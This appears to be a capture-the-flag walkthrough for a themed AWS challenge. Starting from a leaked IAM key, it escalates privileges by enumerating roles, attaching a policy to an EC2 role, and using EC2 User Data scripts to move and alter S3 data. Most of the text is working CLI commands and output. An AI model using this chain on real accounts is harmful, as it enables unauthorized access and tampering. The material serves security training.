Clue 1:Mr. Meeseeks Identity Crisis
Mr. Meeseeks Identity Crisis

You got an IAM access key, what are you waiting for?

In this challenge, you do not need to be OPSEC safe, but why now? So limit the recon to what you really want to know. To start with, as you would do in a real exercise, save the IAM access keys to .aws/credentials and assign a profile name to it. All the examples will use the profile "galactic".

Replace example ids for your challenge's environment:
Replace the example AWS account number 111122223333. Remember the AWS account number is part of S3 Bucket names and ARNs.

Some of the calls to use (feel free to come out with your own):
aws sts get-caller-identity --profile galactic [now you have the IAM user ARN, including the AWS account number and UserId]
aws s3 ls --profile galactic [got nothing, least privilege right?]
aws iam list-attached-user-policies --user-name galactic-jenkins --profile galactic [got nothing, no policy attached]
aws iam list-user-policies --user-name galactic-jenkins --profile galactic [now you got the current policy name, must be an inline policy]
aws iam get-user-policy --user-name galactic-jenkins --policy-name jenkins_policy --profile galactic [now you have the policy statement, BINGO!]
aws s3api list-objects-v2 --bucket galactic-federation-jenkins-code-111222333444 --profile galactic [Among other entitlements, you have access to a S3 Bucket, list what is in it...]
[... and download the contents. that is a bash script example, but you can use whatever codeing language you want.]
#!/bin/bash
for i in {9857..9863}; do
aws s3api get-object --bucket galactic-federation-jenkins-code-111222333444 --profile galactic --key "notes/shift-notes-${i}" shift-notes-${i};
done

Responses to the AWS CLI calls are not displayed here, will be available in the last clue, the full walkthrough.
Penalty: 26 points
Clue 2:Bird Person Obfuscation
Bird Person Obfuscation

You got the files and they are not human readable. At least not all humans can, but I bet some can.

Bird Person is not human, so he is able to figure out this is not KMS client side encryption, just double base64 encoding.

This is a bash script to help speed up the decoding process, granted you have downloaded the files previously:
#!/bin/bash
for i in {9857..9863}; do
base64 --decode shift-notes-${i} > shift-notes-${i}.b64;
base64 --decode shift-notes-${i}.b64 > shift-notes-${i}.md;
done
cat shift-notes-*.md

One of the files will contain this revealing piece of information:

Shift notes from October, 15th 2066
If you work overtime, clock in and clock out in the galactic time tracking system
Expense code for galactic jacket laundry is C-137
Make sure galactic node.js version 8 is used for lambda functions
Hawaian pizza is free every Tuesday at the galactic cafeteria, get the vouchers with captain sdrufles
The standard galactic linux AMI is found using this command, replace aws_region for the region you are deploying it:
aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2" "Name=state,Values=available" \
  --query "reverse(sort_by(Images, &CreationDate))[:1].ImageId" \
  --output text \
  --region aws_region
Report human infestation to the galactic pest control center
The galactic SOC has reported attempts to break into our galactic Jenkins servers, security engineering is looking into it, stay alert and report any suspicious activity to the security tips hotline
s3_level7_role is not working anymore to access the galactic system, cloud engineering working on a fix
All changes need to go through proper approvals, do not push new code to production without an approved ticket
The soda machine is not taking bitcoin anymore due to the big ledger hack, etherium is still accepted
If you stay after 22:00, you are entitled to take a taxi home that is reinbursable
Now you back on your own. If you need more help, Summer will be there for you.
Penalty: 30 points
Clue 3:In Summer We Trust
In Summer We Trust

Replace example ids for your challenge's environment:
Replace the example AWS account number 111122223333. Remember the AWS account number is part of S3 Bucket names and ARNs.
The useful pieces of information are the following:
The standard galactic linux AMI is found using this command, replace "us-west-2" for the region you are deploying it:
aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2" "Name=state,Values=available" \
  --query "reverse(sort_by(Images, &CreationDate))[:1].ImageId" \
  --output text \
  --region us-west-2
s3_level7_role is not working anymore to access the galactic system, cloud engineering working on a fix

Unless the note is part of a sophisticated honeypot, which is not, use what you got:
If at some point you will need to spin an EC2 instance, issue the command above, the AMI id is dependent on the AWS Region.
You know that level 9 is required for access, there is a mention to a level7 role named s3_level7_role.

How about some fuzzing? Might be noisy, but, there are no other alternatives at the moment:
#!/bin/bash
for i in {1..9}; do
aws iam get-role --role-name s3_level${i}_role --profile galactic;
done

There is indeed a role named s3_level9_role, the trust policy allows for EC2 service assumption only.

Now it is time to check what policies are attached to the newly discovered role:
aws iam list-attached-role-policies --role-name s3_level9_role --profile galactic

Well, we hit water here. There are no attached policies.

However, we are in luck, as we have iam:List* and iam:Get* in our IAM access key policy. So let's see if we find a suitable policy:
aws iam list-policies --profile galactic

Well, that is a long list, but we did it! There is an s3_level9_policy. Don't you love standard naming conventions? The Galactic Federation is so predictable :)

So now let's check what we got:
aws iam get-policy --policy-arn arn:aws:iam::111222333444:policy/s3_level9_policy --profile galactic
aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::111222333444:policy/s3_level9_policy --profile galactic

Now we are cooking, figured out another S3 bucket name!
galactic-federation-level9-access-111222333444

But hey, we need to attach the policy to the role to make it work:
aws iam attach-role-policy --policy-arn arn:aws:iam::111222333444:policy/s3_level9_policy --role-name s3_level9_role --profile galactic

Well, they have not figured out we are here yet, so let's check if the role now has the policy:
aws iam list-attached-role-policies --role-name s3_level9_role --profile galactic;

Now you are back to your own noodles, try to figure out a way to access that S3 bucket using what you have. Morty is next in the line to help you if you need further assistance.
Penalty: 30 points
Clue 4:EC2rization of The Morty
EC2rization of The Morty

You are going to hang out with Morty for a while. This is the longest part and prone to human error.

Well, we have the s3_level9_role that can be assumed by the EC2 service

So now, we need an EC2 instance to run arbitrary code to further discover what is in the S3 bucket galactic-federation-level9-access-111122223333

The IAM access key policy does provide you with all access you need, as it seems it was part of a CI/CD pipeline, so it can spin EC2 instances, create instance profiles and attached roles to them.

By using the EC2 User Data attribute, you will be able to run your own code! You can try a reverse shell, but it will required exposing your listener to the internet, if you can do that, by all means, go ahead and try! Using a bind shell will make this a lot more complicated, you will need to take into account VPC components such as route tables, internet gateways, Security Groups, NACLs, CIDRs. Lot's of work. With that said, there is a viable alternative to try first:
Write an EC2 User Data script to enumerate and get the objects in the S3 bucket galactic-federation-level9-access-111122223333 and put those in the S3 bucket galactic-federation-jenkins-code-111122223333. If the EC2 User Data script runs properly, you will be able to access the objects with your IAM access key, you can check how the currency value is stored, make the change, use your IAM access key to put the modified version into the S3 bucket galactic-federation-jenkins-code-111122223333 and use another EC2 User data script to push the change to the S3 bucket galactic-federation-level9-access-111122223333. Sounds fun? Lots of work and you need to be very careful, any typos in the bash scripts or errors pushing the User Data will render in failure.
HERE WE GO!

Replace example ids for your challenge's environment:
Replace the example AWS account number 111122223333. Remember the AWS account number is part of S3 Bucket names and ARNs.
Replace the example EC2 instance id i-1234567890abcdef0.
Replace the example EC2 instance profile association id iip-assoc-1234567890abcdef0.
Replace the example AWS Region us-west-2.
Replace the example AWS_ACCESS_KEY_ID AKIAIOSFODNN7EXAMPLE.
Replace the example AWS_SECRET_ACCESS_KEY wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY.
Replace the example AMI id ami-1234567890abcdef0
Replace the example VPC Subnet id subnet-0123456789abcdefg

ONE - Prepare the EC2 instance to run the User Data scripts.
Find the AMI to use with the AWS region. Replace aws_region for the challenge's region:

aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2" "Name=state,Values=available" \
  --query "reverse(sort_by(Images, &CreationDate))[:1].ImageId" \
  --output text \
  --region us-west-2 \
  --profile galactic
ami-1234567890abcdef0
Spin an EC2 instance - aws ec2 run-instances --image-id ami-1234567890abcdef0 --instance-type t2.micro --region us-west-2 --subnet-id subnet-0123456789abcdefg --profile galactic

Check status of EC2 instance - aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State' jq is your best friend to get to the information you need. So the instance is indeed running and waiting for us.

Create the EC2 instance profile - aws iam create-instance-profile --instance-profile-name s3_level9_access_profile --profile galactic

Add the role to the EC2 instance profile - aws iam add-role-to-instance-profile --role-name s3_level9_role --instance-profile-name s3_level9_access_profile --profile galactic

Associate the EC2 instance profile with the intance - aws ec2 associate-iam-instance-profile --instance-id i-1234567890abcdef0 --iam-instance-profile Name=s3_level9_access_profile --profile galactic --region us-west-2.

Verify the association until it is complete: aws ec2 describe-iam-instance-profile-associations --association-ids iip-assoc-1234567890abcdef0 --profile galactic --region us-west-2.


TWO - Upload the first User Data bash script that will get the objects from galactic-federation-level9-access-111122223333 S3 bucket and place them in galactic-federation-jenkins-code-111122223333 S3 bucket and start the EC2 instance to run it:
Stop the EC2 instance you prepped - aws ec2 stop-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

Keep checking status of EC2 instance until it is in "stopped" state - aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

Prepare the User Data bash script to perform the actions needed using the correct set of credentials. You will need to encode with base64 to be uploaded to the EC2 instance User Data attribute.

The code below is wrapped with a statement forcing the bash script to run at every EC2 instance start. User Data by default only runs when the EC2 instance is initially provisioned.

You don't need to use this exact script, you can replace it with a reverse shell if you are confident you can pull that off. pull_secrets.sh code:

Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
ak=${AWS_ACCESS_KEY_ID}
sk=${AWS_SECRET_ACCESS_KEY}
st=${AWS_SESSION_TOKEN}
keys=$(aws s3api list-objects-v2 --bucket galactic-federation-level9-access-111122223333 --query '.Contents[*].Key' --output text)
for k in ${keys}; do
aws s3api get-object --bucket galactic-federation-level9-access-111122223333 --key ${k} ${k};
done
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
unset AWS_SESSION_TOKEN
for k in ${keys}; do
aws s3api put-object --bucket galactic-federation-jenkins-code-111122223333 --key secret/${k} --body ${k};
done
export AWS_ACCESS_KEY_ID=${ak}
export AWS_SECRET_ACCESS_KEY=${sk}
export AWS_SESSION_TOKEN=${st}
--//
Modify the EC2 instance User Data attribute, effectively uploading the base64 of your (or the example above) bash script to it - aws ec2 modify-instance-attribute --profile galactic --region us-west-2 --instance-id i-1234567890abcdef0 --attribute userData --value file://pull_secrets.b64.

Check if the instance profile has been modified correctly - aws ec2 describe-instance-attribute --attribute userData --instance-id i-1234567890abcdef0 --profile galactic --region us-west-2 | jq -r '.UserData.Value' | base64 --decode.

It is a good time to review the bash script - As you have probably noticed, it is using the EC2 instance profile to list and get the objects from the galactic-federation-level9-access-111122223333 S3 bucket and the IAM access key you got from Jerry to put the objects in the galactic-federation-jenkins-code-111122223333 S3 bucket you can directly access.

It is a really bad idea to embed secrets in clear text in the User Data attribute, but trying to use the Galactic Federation AWS System Management Parameter Store or AWS Secrets Manager will make this too hard and trigger detection.

Now it is time to start the EC2 instance with the new User Data attribute and check for results - aws ec2 start-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

Keep checking until the EC2 instance is in "running" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

You are essentially flying without instruments with poor visibility. But this should work properly if there are no typos in the bash scripts and the procedure is followed 100%. If you decided to go with the reverse shell route, you will have additional visibility and won't need to perform most of the next steps. Kudos to you if you pull that off!

THREE - Get the objects from galactic-federation-jenkins-code-111122223333 S3 bucket, analyze them, make the changes and put them back modified:
Here is a sample bash script to get all the objects the User Data bash script saved in the galactic-federation-jenkins-code-111122223333 S3 bucket
#!/bin/bash
keys=$(aws s3api list-objects-v2 --bucket galactic-federation-jenkins-code-111122223333 --profile galactic | jq -r ''.Contents[].Key'')
for k in ${keys}; do
aws s3api get-object --bucket galactic-federation-jenkins-code-111122223333 --profile galactic --key ${k} ${k};
done
You noticed that one single file controls the value of the unified Galactic Federation currency! So let's change that from 1 to 0 and upload back to galactic-federation-jenkins-code-111122223333 S3 bucket we have direct access:
#!/bin/bash
# check value
cat secret/currency_value
# change value from 1 to 0
echo "0" > secret/currency_value
# upload to s3 bucket
aws s3api put-object --profile galactic --bucket galactic-federation-jenkins-code-111122223333 --key secret/currency_value --body secret/currency_value

FOUR - Reset the EC2 instance User Data attribute, upload a new bash script to get the new currency_value file from galactic-federation-jenkins-code-111122223333 S3 bucket to galactic-federation-level9-access-111122223333 S3 bucket:
Stop the EC2 instance aws ec2 stop-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

Keep checking until the EC2 instance is in "stopped" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

Reset User Data attribute - aws ec2 modify-instance-attribute --profile galactic --region us-west-2 --instance-id i-1234567890abcdef0 --user-data Value=.

Describe the User Data attribute, should be empty aws ec2 describe-instance-attribute --attribute userData --instance-id i-1234567890abcdef0 --profile galactic --region us-west-2 .

Start the EC2 instance with an empty User Data attribute aws ec2 start-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

Keep checking until the EC2 instance is in "running" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

Stop the EC2 instance aws ec2 stop-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

Keep checking until the EC2 instance is in "stopped" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

Prepare the User Data bash script to perform the actions needed using the correct set of credentials. You will need to encode with base64 to be uploaded to the EC2 instance User Data attribute.

The code below is wrapped with a statement forcing the bash script to run at every EC2 instance start. User Data by default only runs when the EC2 instance is initially provisioned.

You don't need to use this exact script, you can replace it with a reverse shell if you are confident you can pull that off. push_secrets.sh code:

Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
yum install -y jq
ak=${AWS_ACCESS_KEY_ID}
sk=${AWS_SECRET_ACCESS_KEY}
st=${AWS_SESSION_TOKEN}
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
unset AWS_SESSION_TOKEN
aws s3api get-object --bucket galactic-federation-jenkins-code-111122223333 --key secret/currency_value currency_value
export AWS_ACCESS_KEY_ID=${ak}
export AWS_SECRET_ACCESS_KEY=${sk}
export AWS_SESSION_TOKEN=${st}
aws s3api put-object --bucket galactic-federation-level9-access-111122223333 --key currency_value --body currency_value
--//
Load the User Data attribute aws ec2 modify-instance-attribute --profile galactic --region us-west-2 --instance-id i-1234567890abcdef0 --attribute userData --value file://push_secrets.b64.

Check if the instance profile has been modified correctly - aws ec2 describe-instance-attribute --attribute userData --instance-id i-1234567890abcdef0 --profile galactic --region us-west-2 | jq -r '.UserData.Value' | base64 --decode.

It is a good time to review the bash script - As you have probably noticed, it is using the IAM access key you got from Jerry to get the currency_value file from the galactic-federation-jenkins-code-111122223333 and the EC2 instance profile to put it to galactic-federation-level9-access-111122223333.

Like I mentioned before, it is a really bad idea to embed secrets in clear text in the User Data attribute, but we are doing a security posture review exercise, so we have a pass.

Now it is time to start the EC2 instance with the new User Data attribute and check for results - aws ec2 start-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

Keep checking until the EC2 instance is in "running" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.


If all goes well, you just toppled the Galactic Federation! Congratulations human!

Troubleshooting:
Code accuracy and order of steps matter. Double check everything if you are not getting the results expected
Check if you are using the correct AWS CLI profile using the IAM access keys provided
Check if you are using the EXACT SAME AWS region for all the EC2 calls
Call for a human facilitator if everything fails
Penalty: 30 points
Clue 5:Total Rickall
Total Rickall

This is an aggregation of all clues but this time including the AWS CLI responses.
Replace example ids for your challenge's environment:
Replace the example AWS account number 111122223333. Remember the AWS account number is part of S3 Bucket names and ARNs.

Replace the example EC2 instance id i-1234567890abcdef0.

Replace the example EC2 instance profile association id iip-assoc-1234567890abcdef0.

Replace the example AWS Region us-west-2.

Replace the example AWS_ACCESS_KEY_ID AKIAIOSFODNN7EXAMPLE.

Replace the example AWS_SECRET_ACCESS_KEY wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY.

Replace the example AMI id ami-1234567890abcdef0

aws sts get-caller-identity --profile galactic [now you have the IAM user ARN, including the AWS account number and UserId]

{
  "UserId": "AKIAIOSFODNN7EXAMPLE",
  "Account": "111122223333",
  "Arn": "arn:aws:iam::111122223333:user/galactic-jenkins"
}
aws s3 ls --profile galactic [got nothing, least privilege right?]

aws iam list-attached-user-policies --user-name galactic-jenkins --profile galactic [got nothing, no policy attached]

aws iam list-user-policies --user-name galactic-jenkins --profile galactic [now you got the current policy name, must be an inline policy]

{
  "PolicyNames": [
      "jenkins_policy"
  ]
}
aws iam get-user-policy --user-name galactic-jenkins --policy-name jenkins_policy --profile galactic [now you have the policy statement, BINGO!]

{
  "UserName": "galactic-jenkins",
  "PolicyName": "jenkins_policy",
  "PolicyDocument": {
      "Version": "2012-10-17",
      "Statement": [
          {
              "Action": [
                  "iam:AttachRolePolicy",
                  "iam:CreateInstanceProfile",
                  "iam:AddRoleToInstanceProfile",
                  "iam:PassRole"
              ],
              "Resource": "*",
              "Effect": "Allow",
              "Sid": "IAMPermissionsForInstanceRole"
          },
          {
              "Action": [
                  "iam:List*",
                  "iam:Get*"
              ],
              "Resource": "*",
              "Effect": "Allow",
              "Sid": "ForTemporaryTroubleshootingRemoveWhenDone"
          },
          {
              "Action": [
                  "ec2:*"
              ],
              "Resource": [
                  "*"
              ],
              "Effect": "Allow",
              "Sid": "EC2PermissionsForJenkinsPipeline"
          },
          {
              "Action": [
                  "s3:GetObject",
                  "s3:PutObject",
                  "s3:ListBucket"
              ],
              "Resource": [
                  "arn:aws:s3:::galactic-federation-jenkins-code-111122223333",
                  "arn:aws:s3:::galactic-federation-jenkins-code-111122223333/*"
              ],
              "Effect": "Allow",
              "Sid": "JenkinsCodeStorage"
          }
      ]
  }
}
aws s3api list-objects-v2 --bucket galactic-federation-jenkins-code-111122223333 --profile galactic | jq -r '.Contents[].Key' [Among other entitlements, you have access to a S3 Bucket, list what is in it...]

notes/shift-notes-9857
notes/shift-notes-9858
notes/shift-notes-9859
notes/shift-notes-9860
notes/shift-notes-9861
notes/shift-notes-9862
notes/shift-notes-9863
[... download the objects and decode them.]

#!/bin/bash
mkdir notes
for i in {9857..9863}; do
aws s3api get-object --bucket galactic-federation-jenkins-code-111122223333 --profile galactic --key "notes/shift-notes-${i}" notes/shift-notes-${i};
base64 --decode notes/shift-notes-${i} > notes/shift-notes-${i}.b64;
base64 --decode notes/shift-notes-${i}.b64 > notes/shift-notes-${i}.md;
done

The only note that matters: cat shift-notes-9861.md. You can cat the others, they are a distraction.

### Shift notes from October, 15th 2066

* If you work overtime, clock in and clock out in the galactic time tracking system
* Expense code for galactic jacket laundry is C-137
* Make sure galactic node.js version 8 is used for lambda functions
* Hawaian pizza is free every Tuesday at the galactic cafeteria, get the vouchers with captain sdrufles
* The standard galactic linux AMI is found using this command, replace "aws_region" for the region you are deploying it:

aws ec2 describe-images \
    --owners amazon \
    --filters "Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2" "Name=state,Values=available" \
    --query "reverse(sort_by(Images, &CreationDate))[:1].ImageId" \
    --output text \
    --region aws_region

* Report human infestation to the galactic pest control center
* The galactic SOC has reported attempts to break into our galactic Jenkins servers, security engineering is looking into it, stay alert and report any suspicious activity to the security tips hotline
* s3_level7_role is not working anymore to access the galactic system, cloud engineering working on a fix
* All changes need to go through proper approvals, do not push new code to production without an approved ticket
* The soda machine is not taking bitcoin anymore due to the big ledger hack, etherium is still accepted
* If you stay after 22:00, you are entitled to take a taxi home that is reinbursable
Let's try to enumerate a role that could help us:
#!/bin/bash
for i in {1..9}; do
aws iam get-role --role-name s3_level${i}_role --profile galactic;
done

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level1_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level2_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level3_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level4_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level5_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level6_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level7_role cannot be found.

An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name s3_level8_role cannot be found.
{
    "Role": {
        "Path": "/",
        "RoleName": "s3_level9_role",
        "RoleId": "AROAIOSFODNN7EXAMPLE",
        "Arn": "arn:aws:iam::111122223333:role/s3_level9_role",
        "CreateDate": "2021-02-22T15:53:32+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "ec2.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "Description": "",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {}
    }
}
Found the role, now check policies attached: aws iam list-attached-role-policies --role-name s3_level9_role --profile galactic

{
  "AttachedPolicies": []
}
No policies attached, let's recon again and see what policies might help: aws iam list-policies --profile galactic. It is a long response, cropped just the policy of interest.

...
{
  "PolicyName": "s3_level9_policy",
  "PolicyId": "ANPAIOSFODNN7EXAMPLE",
  "Arn": "arn:aws:iam::111122223333:policy/s3_level9_policy",
  "Path": "/",
  "DefaultVersionId": "v1",
  "AttachmentCount": 0,
  "PermissionsBoundaryUsageCount": 0,
  "IsAttachable": true,
  "CreateDate": "2021-02-22T15:53:32+00:00",
  "UpdateDate": "2021-02-22T15:53:32+00:00"
}
...
Check the policy: aws iam get-policy --policy-arn arn:aws:iam::111122223333:policy/s3_level9_policy --profile galactic

{
  "Policy": {
      "PolicyName": "s3_level9_policy",
      "PolicyId": "ANPAIOSFODNN7EXAMPLE",
      "Arn": "arn:aws:iam::111122223333:policy/s3_level9_policy",
      "Path": "/",
      "DefaultVersionId": "v1",
      "AttachmentCount": 0,
      "PermissionsBoundaryUsageCount": 0,
      "IsAttachable": true,
      "CreateDate": "2021-02-22T15:53:32+00:00",
      "UpdateDate": "2021-02-22T15:53:32+00:00"
  }
}
Retrieve policy statement: aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::111122223333:policy/s3_level9_policy --profile galactic

{
  "PolicyVersion": {
      "Document": {
          "Version": "2012-10-17",
          "Statement": [
              {
                  "Action": [
                      "s3:GetObject",
                      "s3:PutObject",
                      "s3:ListBucket"
                  ],
                  "Resource": [
                      "arn:aws:s3:::galactic-federation-level9-access-111122223333",
                      "arn:aws:s3:::galactic-federation-level9-access-111122223333/*"
                  ],
                  "Effect": "Allow",
                  "Sid": "Level9AccessPolicy"
              }
          ]
      },
      "VersionId": "v1",
      "IsDefaultVersion": true,
      "CreateDate": "2021-02-22T15:53:32+00:00"
  }
}
Attach the policy to the role: aws iam attach-role-policy --policy-arn arn:aws:iam::111122223333:policy/s3_level9_policy --role-name s3_level9_role --profile galactic. There is no response message when succesful. Quick check if there were errors and "0" means there were not.

echo $?
0
For verification's sake: aws iam list-attached-role-policies --role-name s3_level9_role --profile galactic

{
  "AttachedPolicies": [
      {
          "PolicyName": "s3_level9_policy",
          "PolicyArn": "arn:aws:iam::111122223333:policy/s3_level9_policy"
      }
  ]
}
As explained in Clue 4, an EC2 instance will be required to access the level9 S3 Bucket

Use the AWS Region the challenge is provisioned at. That can be checked at the Challenge main page, at the bottom close to the middle.

Find the AMI to use with the AWS region. Replace aws_region for the challenge's region:

aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-2.0.????????.?-x86_64-gp2" "Name=state,Values=available" \
  --query "reverse(sort_by(Images, &CreationDate))[:1].ImageId" \
  --output text \
  --region aws_region \
  --profile galactic
ami-1234567890abcdef0
Deploy on EC2 instance: aws ec2 run-instances --image-id ami-1234567890abcdef0 --instance-type t2.micro --region us-west-2 --profile galactic --subnet-id subnet-0123456789abcdefg. You will only need the EC2 InstanceId:

{
  "Groups": [],
  "Instances": [
      {
          "AmiLaunchIndex": 0,
          "ImageId": "ami-1234567890abcdef0",
          "InstanceId": "i-1234567890abcdef0",
          "InstanceType": "t2.micro",
          "LaunchTime": "2021-02-22T19:38:42+00:00",
... REMAINDER OF RESPONSE REMOVED FOR BREVITY
}
Keep checking until the EC2 instance is available: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'

{
"Code": 16,
"Name": "running"
}
Create the EC2 instance profile aws iam create-instance-profile --instance-profile-name s3_level9_access_profile --profile galactic

{
  "InstanceProfile": {
      "Path": "/",
      "InstanceProfileName": "s3_level9_access_profile",
      "InstanceProfileId": "AIPAIOSFODNN7EXAMPLE",
      "Arn": "arn:aws:iam::111122223333:instance-profile/s3_level9_access_profile",
      "CreateDate": "2021-02-22T19:42:26+00:00",
      "Roles": []
  }
}
Add the role to the EC2 instance profile - aws iam add-role-to-instance-profile --role-name s3_level9_role --instance-profile-name s3_level9_access_profile --profile galactic. There is no output on success. But you can check for errors:

echo $?
0
Associate the EC2 instance profile with the instance - aws ec2 associate-iam-instance-profile --instance-id i-1234567890abcdef0 --iam-instance-profile Name=s3_level9_access_profile --profile galactic --region us-west-2

{
  "IamInstanceProfileAssociation": {
      "AssociationId": "iip-assoc-1234567890abcdef0",
      "InstanceId": "i-1234567890abcdef0",
      "IamInstanceProfile": {
          "Arn": "arn:aws:iam::111122223333:instance-profile/s3_level9_access_profile",
          "Id": "AIPA5C25JJKBKOIORRYMO"
      },
      "State": "associating"
  }
}
Verify the association until it is complete: aws ec2 describe-iam-instance-profile-associations --association-ids iip-assoc-1234567890abcdef0 --profile galactic --region us-west-2

{
  "IamInstanceProfileAssociations": [
      {
          "AssociationId": "iip-assoc-0582d7e3450de88b5",
          "InstanceId": "i-1234567890abcdef0",
          "IamInstanceProfile": {
              "Arn": "arn:aws:iam::111122223333:instance-profile/s3_level9_access_profile",
              "Id": "AIPAIOSFODNN7EXAMPLE"
          },
          "State": "associated"
      }
  ]
}
Stop the EC2 instance you prepped - aws ec2 stop-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

{
  "StoppingInstances": [
      {
          "CurrentState": {
              "Code": 64,
              "Name": "stopping"
          },
          "InstanceId": "i-1234567890abcdef0",
          "PreviousState": {
              "Code": 16,
              "Name": "running"
          }
      }
  ]
}
Keep checking status of EC2 instance until it is in "stopped" state - aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

{
"Code": 80,
"Name": "stopped"
}
This is the code to be saved into the EC2 instance User Data attribute:

Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
ak=${AWS_ACCESS_KEY_ID}
sk=${AWS_SECRET_ACCESS_KEY}
st=${AWS_SESSION_TOKEN}
keys=$(aws s3api list-objects-v2 --bucket galactic-federation-level9-access-111122223333 --query 'Contents[*].Key' --output text)
for k in ${keys}; do
aws s3api get-object --bucket galactic-federation-level9-access-111122223333 --key ${k} ${k};
done
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
unset AWS_SESSION_TOKEN
for k in ${keys}; do
aws s3api put-object --bucket galactic-federation-jenkins-code-111122223333 --key secret/${k} --body ${k};
done
export AWS_ACCESS_KEY_ID=${ak}
export AWS_SECRET_ACCESS_KEY=${sk}
export AWS_SESSION_TOKEN=${st}
--//
Modify the EC2 instance User Data attribute, effectively uploading the base64 of your (or the example above) bash script to it - aws ec2 modify-instance-attribute --profile galactic --region us-west-2 --instance-id i-1234567890abcdef0 --attribute userData --value file://pull_secrets.b64. There is no output on success. But you can check for errors:

echo $?
0
Check if the instance profile has been modified correctly - aws ec2 describe-instance-attribute --attribute userData --instance-id i-1234567890abcdef0 --profile galactic --region us-west-2 | jq -r '.UserData.Value' | base64 --decode. The output should be identical to the code above:

Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
yum install -y jq
